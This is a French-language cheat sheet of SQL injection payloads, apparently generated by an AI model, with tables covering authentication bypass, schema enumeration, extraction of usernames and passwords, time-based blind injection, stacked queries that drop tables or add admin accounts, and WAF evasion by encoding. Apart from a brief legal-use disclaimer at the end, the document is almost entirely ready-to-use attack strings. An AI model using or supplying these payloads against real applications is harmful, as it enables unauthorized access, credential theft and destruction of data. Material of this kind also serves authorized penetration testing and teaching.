# injections-sql.md

## Cheat Sheet - Injections SQL

Ce document présente une liste de payloads SQL pour tester les vulnérabilités d'injection SQL dans des environnements contrôlés et légaux uniquement.

**Date :** 04 mars 2025  
**Auteur :** Grok 3 (xAI)

---

## 1. Contournement d'authentification (Authentication Bypass)

Payloads pour ignorer les vérifications d'identifiants en manipulant la logique SQL.

| Payload                  | Description                                      |
|--------------------------|--------------------------------------------------|
| `' OR '1'='1' --`        | Condition toujours vraie avec commentaire `--`   |
| `' OR '1'='1' #`         | Même chose avec commentaire `#` (MySQL)          |
| `' OR 1=1 --`            | Variante sans guillemets                         |
| `') OR ('1'='1`          | Contourne avec parenthèses                       |
| `' OR '1'='1' AND ''='`  | Ajoute une condition vide                        |
| `admin' --`              | Injecte directement "admin"                      |
| `admin' #`               | Idem avec commentaire `#`                        |

---

## 2. Exploitation de colonnes et tables

Extraire des métadonnées comme les noms de tables ou de colonnes.

### Enumération des colonnes
| Payload                                                  | Description                                      |
|----------------------------------------------------------|--------------------------------------------------|
| `' UNION SELECT 1,2,3 --`                                | Teste le nombre de colonnes                      |
| `' UNION SELECT null, table_name FROM information_schema.tables --` | Liste les tables                       |
| `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --` | Liste les colonnes d'une table |

### Enumération des tables
| Payload                                                  | Description                                      |
|----------------------------------------------------------|--------------------------------------------------|
| `' UNION SELECT table_name, column_name FROM information_schema.columns --` | Récupère tables et colonnes       |
| `' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --` | Tables de la base courante |

---

## 3. Exfiltration de données

Récupérer des données sensibles comme les identifiants.

| Payload                                                  | Description                                      |
|----------------------------------------------------------|--------------------------------------------------|
| `' UNION SELECT username, password FROM users --`        | Extrait noms d'utilisateur et mots de passe      |
| `' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name='users' --` | Concatène les colonnes |

---

## 4. Injections basées sur le temps (Blind SQL Injection)

Exploiter des délais pour confirmer des conditions.

### Tests de base
| Payload                                                  | Description                                      |
|----------------------------------------------------------|--------------------------------------------------|
| `' OR IF(1=1, SLEEP(5), 0) --`                          | Test simple avec délai de 5s                     |
| `' AND IF(LENGTH(database())>5, SLEEP(5), 0) --`         | Vérifie la longueur du nom de la base            |

### Extraction lettre par lettre
| Payload                                                  | Description                                      |
|----------------------------------------------------------|--------------------------------------------------|
| `' AND IF(SUBSTRING((SELECT database()),1,1)='a', SLEEP(5), 0) --` | Teste la 1re lettre de la base |
| `' AND ASCII(SUBSTRING((SELECT user()),1,1)) > 100 --`   | Compare la valeur ASCII de l'utilisateur         |

---

## 5. Requêtes empilées (Stacked Queries)

Exécuter plusieurs requêtes dans une seule injection.

| Payload                                                  | Description                                      |
|----------------------------------------------------------|--------------------------------------------------|
| `'; DROP TABLE users; --`                                | Supprime la table "users"                        |
| `'; UPDATE users SET is_admin=1 WHERE username='admin'; --` | Modifie un utilisateur                     |
| `'; INSERT INTO users (username, password) VALUES ('hacker', '1234'); --` | Ajoute un utilisateur          |

---

## 6. Contournement des pare-feux

Éviter les filtres WAF avec encodage ou commentaires.

### Encodage URL
| Payload                  | Description                                      |
|--------------------------|--------------------------------------------------|
| `%27%20OR%20%271%27=%271 --` | `' OR '1'='1 --` encodé                        |
| `%27%20UNION%20SELECT%20null,null,null --` | UNION encodé                               |

### Commentaires inline
| Payload                          | Description                                      |
|----------------------------------|--------------------------------------------------|
| `admin'/**/OR/**/'1'='1'--`      | Ajoute des commentaires entre les mots           |
| `' OR '1'='1'/**/AND/**/'a'='a --` | Variante avec condition supplémentaire       |

---

## 7. Champs numériques

Pour les injections dans des champs attendant des nombres.

| Payload                          | Description                                      |
|----------------------------------|--------------------------------------------------|
| `1 OR 1=1 --`                   | Condition toujours vraie                         |
| `1 AND 1=2 UNION SELECT 1, database() --` | Récupère le nom de la base             |
| `1 UNION SELECT null, user() --` | Récupère l'utilisateur courant                  |

---

## 8. Détection de la version du serveur

Identifier le SGBD ou ses détails.

| Payload                          | Description                                      |
|----------------------------------|--------------------------------------------------|
| `' UNION SELECT @@version --`    | Version du serveur (MSSQL/MySQL)                 |
| `' UNION SELECT version() --`    | Version (MySQL/PostgreSQL)                       |
| `' UNION SELECT @@hostname --`   | Nom d'hôte (MSSQL)                               |

---

## 9. Attaques sur XML/JSON

Exploiter des données structurées dans SQL.

| Payload                                  | Description                                      |
|------------------------------------------|--------------------------------------------------|
| `' AND JSON_CONTAINS('[1,2,3]', '2') --` | Teste une condition JSON                         |
| `' UNION SELECT ExtractValue(xml_data, '//user/name') FROM users --` | Extrait des données XML      |

---

## 10. Payloads avancés

Techniques complexes pour des scénarios spécifiques.

| Payload                                                  | Description                                      |
|----------------------------------------------------------|--------------------------------------------------|
| `' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() --` | Liste toutes les tables |
| `' OR IF((SELECT COUNT(*) FROM users WHERE is_admin=1)>0, SLEEP(5), 0) --` | Vérifie les admins avec délai |
| `' UNION SELECT user(), current_user(), session_user() --` | Récupère les utilisateurs système         |

---

## Précautions
- **Usage légal uniquement** : Tests autorisés dans des environnements contrôlés.
- **Outils recommandés** : SQLMap pour automatiser les injections complexes.
